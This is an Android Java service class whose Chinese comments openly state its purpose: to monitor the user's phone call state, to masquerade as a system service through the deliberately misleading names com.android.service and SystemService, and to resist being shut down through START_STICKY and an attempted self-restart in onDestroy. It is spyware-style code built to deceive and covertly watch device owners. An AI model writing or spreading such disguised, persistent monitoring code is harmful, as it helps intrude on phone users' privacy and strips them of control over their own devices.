package com.android.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

/**
 * 一个监听用户电话状态的服务<br/>
 * 为防止服务被关闭，在onDestroy中我们又启动了另一个完全一样的服务，这样便可达到永远无法关闭服务的目的。<br/>
 * 为混淆用户，我们故意使用包名com.android.service及类名SystemService，让用户以为这是系统后台服务！
 */
public class SystemService extends Service {
	private PhoneStateListener listener;
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public void onCreate() {
		TelephonyManager manager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		listener = new MyPhoneStateListener();
		manager.listen(listener, PhoneStateListener.LISTEN_CALL_STATE);
		Log.i("bqt", "onCreate");
		super.onCreate();
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.i("bqt", "onStartCommand");
		return START_STICKY;//当service因内存不足被kill，当内存又有的时候，service又被重新创建
	}
	
	@Override
	public void onDestroy() {
		Log.i("bqt", "onDestroy");
		//startService(new Intent(this, SystemService.class));//在onDestroy中再启动本服务，但是用户杀进程时不会调用onDestroy方法
		// 取消电话的监听
		((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).listen(listener, PhoneStateListener.LISTEN_NONE);
		listener = null;
		super.onDestroy();
	}
}